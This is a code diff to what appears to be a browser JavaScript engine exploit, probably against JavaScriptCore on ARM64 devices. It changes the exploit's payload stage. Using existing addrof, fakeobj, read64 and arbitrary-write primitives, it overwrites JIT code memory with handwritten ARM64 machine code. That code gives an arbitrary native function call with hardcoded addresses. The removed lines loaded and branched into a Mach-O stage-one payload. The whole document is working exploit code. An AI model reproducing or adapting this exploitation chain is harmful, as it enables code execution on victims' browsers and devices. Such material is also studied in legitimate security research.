@@ -345,16 +345,40 @@ function pwn() {
         }
     }
 
-    let myOBJ = {a: 0x1337};
-    let myOBJAddr = addrof(myOBJ);
-    log(`[*] myOBJAddr = ${(myOBJAddr).toString(16)}`);
-    let fakeOBJ = fakeobj(myOBJAddr);
-    log(`[*] fakeOBJ = ${(fakeOBJ.a).toString(16)}`);
-    let myOBJ2 = {b: 0x4141};
-    let myOBJAddr2 = addrof(myOBJ2);
-    log(`[*] myOBJAddr2 = ${(myOBJAddr2).toString(16)}`);
-    let fakeOBJ2 = fakeobj(myOBJAddr2);
-    log(`[*] fakeOBJ2 = ${(fakeOBJ2.b).toString(16)}`);
+    let arbCallBytes = new Uint8Array([
+        0x00, 0x00, 0x00, 0x10,
+        0x11, 0x24, 0x40, 0xF9,
+        0x35, 0x02, 0x40, 0xF9,
+        0x36, 0x22, 0x00, 0x91,
+        0x20, 0x0A, 0x40, 0xF9,
+        0x21, 0x0E, 0x40, 0xF9,
+        0x22, 0x12, 0x40, 0xF9,
+        0x23, 0x16, 0x40, 0xF9,
+        0x24, 0x1A, 0x40, 0xF9,
+        0x25, 0x1E, 0x40, 0xF9,
+        0x26, 0x22, 0x40, 0xF9,
+        0x27, 0x26, 0x40, 0xF9,
+        0x28, 0x2A, 0x40, 0xF9,
+        0xF7, 0x03, 0x1E, 0xAA,
+        0xA0, 0x02, 0x3F, 0xD6,
+        0xFE, 0x03, 0x17, 0xAA,
+        0xC0, 0x02, 0x00, 0xF9,
+        0xC0, 0x03, 0x5F, 0xD6,
+        
+        // address here
+        0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00
+    ]);
+    
+    let array = new Uint8Array(0x2345).fill(0);
+    let arrayView = new DataView(array.buffer);
+    let arrayAddr = read64(addrof(array) + 0x10);
+    log(`[+] arrayAddr = 0x${arrayAddr.toString(16)}`);
+
+    let arbCallBytesView = new DataView(arbCallBytes.buffer);
+    arbCallBytesView.setBigUint64(0x48, BigInt(arrayAddr), true);
+
+
     var shellcodeFuncAddr = addrof(shellcodeFunc);
     log(`[+] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
     var executableAddr = read64(shellcodeFuncAddr + 24);
@@ -363,51 +387,23 @@ function pwn() {
     log(`[+] JITCode instance @ ${jitCodeAddr.toString(16)}`);
     var JITCode = read64(jitCodeAddr + 0x1a8);
     log(`[+] JITCode @ ${JITCode.toString(16)}`);
+    ArbitraryWrite(JITCode, arbCallBytes);
     
-    let alignedAddress = Number((BigInt(JITCode) + BigInt(0x4000)) & BigInt(0xFFFFFFFFFFFFF000));
-    log(`[*] JITCode aligned @ 0x${alignedAddress.toString(16)}`);
-    let entryoff = findMainEntryPoint(stage1);
-    log(`[*] entryoff: 0x${entryoff.toString(16)}`);
-    let offset = (alignedAddress - JITCode) + entryoff;
-    log(`[*] offset: 0x${offset.toString(16)}`);
-    let instruction = generate_b_instruction(offset);
-    log(`[*] instruction: 0x${instruction.toString(16)}`);
-    
-    let ourArray = new Uint8Array(stage1.length + 0x4000).fill(0);
-    ourArray.set(stage1, alignedAddress - JITCode);
-    let view = new DataView(ourArray.buffer);
-    view.setUint32(0, instruction, true);
-    
-    ArbitraryWrite(JITCode, ourArray);
-    shellcodeFunc();
-}
-
-function findMainEntryPoint(machOArray) {
-    const LC_MAIN = 0x80000028;
-    
-    let dataView = new DataView(machOArray.buffer);
-    let magic = dataView.getUint32(0x0, true);
-    let ncmds = dataView.getUint32(0x10, true);
-    
-    log(`[*] magic: 0x${magic.toString(16)}`);
-    log(`[*] ncmds: ${ncmds}`);
-    
-    var offset = 32;
-    for (let i = 0; i < ncmds; i++) {
-        let cmd = dataView.getUint32(offset + 0x0, true);
-        let cmdsize = dataView.getUint32(offset + 0x4, true);
-        if (cmd === LC_MAIN) {
-            let entryoff = dataView.getUint32(offset + 0x8, true);
-            return entryoff;
-        }
-        offset += cmdsize;
+    // prep the args
+    //arrayView.setBigUint64(0x0, 0x1918c5280n, true); // malloc
+    arrayView.setBigUint64(0x0, 0x1babf715cn, true); // getpid
+   
+    for (let i = 0; i < 9; i++) {
+        let x = BigInt(i);
+        arrayView.setBigUint64(16 + (i * 8), x, true);
     }
-    throw new Error(`didn't find main entry point!`);
-    return 0;
-}
-
-function generate_b_instruction(offset) {
-    let imm26 = offset / 4;
-    let instruction = 0x14000000 | (imm26 & 0x03FFFFFF);
-    return instruction;
+    arrayView.setBigUint64(16, 22n, true);
+    arrayView.setBigUint64(24, 0x1babf715cn, true);
+    arrayView.setBigUint64(32, BigInt(arrayAddr + 8), true);
+    
+    // make the call
+    shellcodeFunc();
+    
+    let ret = arrayView.getBigUint64(0x8, true);
+    log(`[+] ret = 0x${ret.toString(16)}, ${ret}`);
 }
